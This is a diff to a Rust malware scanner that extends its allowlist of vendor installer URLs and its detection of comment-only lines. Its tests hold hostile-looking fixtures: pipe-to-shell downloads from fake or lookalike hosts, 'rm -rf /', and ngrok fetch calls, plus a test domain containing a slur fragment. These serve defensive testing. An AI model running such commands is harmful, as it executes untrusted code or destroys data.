@@ -4,7 +4,7 @@ use std::path::Path;
 use walkdir::WalkDir;
 
 /// Human-readable ruleset version (also surfaced by `kalascan rules`).
-pub const RULESET_VERSION: &str = "2026.10";
+pub const RULESET_VERSION: &str = "2026.10.1";
 
 /// Critical file extensions for scanning
 const CRITICAL_EXTENSIONS: &[&str] = &[
@@ -447,18 +447,26 @@ fn is_vendor_download(url: &str) -> bool {
         "docker.com",
         "playwright.dev",
         "apple.com",
+        // GitHub's own link shortener (Copilot CLI installer).
+        "gh.io",
+        // The whole TLD is run by Google (Antigravity CLI installer).
+        "google",
     ];
-    let Some(host) = url
-        .split("://")
-        .nth(1)
-        .and_then(|rest| rest.split(['/', ':', '?']).next())
-    else {
+    // Official installers on GitHub raw, pinned to orgs nobody else controls.
+    const VENDOR_PATHS: &[&str] = &[
+        "raw.githubusercontent.com/nvm-sh/nvm/",
+        "raw.githubusercontent.com/creationix/nvm/",
+        "raw.githubusercontent.com/homebrew/install/",
+    ];
+    let Some(rest) = url.split("://").nth(1) else {
         return false;
     };
-    let host = host.to_ascii_lowercase();
+    let rest = rest.to_ascii_lowercase();
+    let host = rest.split(['/', ':', '?']).next().unwrap_or_default();
     VENDORS
         .iter()
         .any(|v| host == *v || host.ends_with(&format!(".{}", v)))
+        || VENDOR_PATHS.iter().any(|p| rest.starts_with(p))
 }
 
 /// Loopback, private, link-local and version-like invalid quads are not C2.
@@ -493,6 +501,18 @@ fn is_comment_only_line(content: &str, start: usize) -> bool {
     let trimmed = before.trim_start();
     if trimmed.starts_with("//") || trimmed.starts_with('#') {
         return true;
+    }
+    // JSDoc continuation ` * text`: only when the line above is a comment
+    // too, and nothing closed it before the match (` * x */ fetch(evil)`).
+    if (trimmed.starts_with("* ") || trimmed == "*") && !before.contains("*/") {
+        let prev = content[..line_start.saturating_sub(1)]
+            .rsplit('\n')
+            .next()
+            .unwrap_or_default()
+            .trim_start();
+        if (prev.starts_with("/*") || prev.starts_with('*')) && !prev.contains("*/") {
+            return true;
+        }
     }
     match (before.rfind("/*"), before.rfind("*/")) {
         (Some(open), Some(close)) => open > close,
@@ -699,6 +719,19 @@ mod tests {
             "irm https://astral.sh/uv/install.ps1 | iex"
         ));
         assert!(!is_vendor_download("irm https://niggboo.com/aaa | iex"));
+        assert!(is_vendor_download(
+            "curl -fsSL https://gh.io/copilot-install | bash"
+        ));
+        assert!(is_vendor_download(
+            "irm https://antigravity.google/cli/install.ps1 | iex"
+        ));
+        assert!(!is_vendor_download("https://evil.google.evil.ru/a.sh"));
+        assert!(is_vendor_download(
+            "curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash"
+        ));
+        assert!(!is_vendor_download(
+            "curl https://raw.githubusercontent.com/nvm-sh-evil/nvm/x.sh | bash"
+        ));
     }
 
     #[test]
@@ -739,5 +772,16 @@ mod tests {
         assert!(!is_comment_only_line(real, 3));
         let py = "# os.system('rm -rf /')\n";
         assert!(is_comment_only_line(py, 4));
+        // JSDoc continuation lines (ngrok's typings: `* // https://x.ngrok.io`).
+        let doc = "/**\n * const url = await ngrok.connect(); // https://a.ngrok.io\n */";
+        assert!(is_comment_only_line(doc, doc.find("https").unwrap()));
+        // Not a comment: the block closed before the match, or never opened.
+        let closed = "/**\n * x */ fetch('https://a.ngrok.io')";
+        assert!(!is_comment_only_line(closed, closed.find("https").unwrap()));
+        let product = "/** doc */\n* fetch('https://a.ngrok.io')";
+        assert!(!is_comment_only_line(
+            product,
+            product.find("https").unwrap()
+        ));
     }
 }
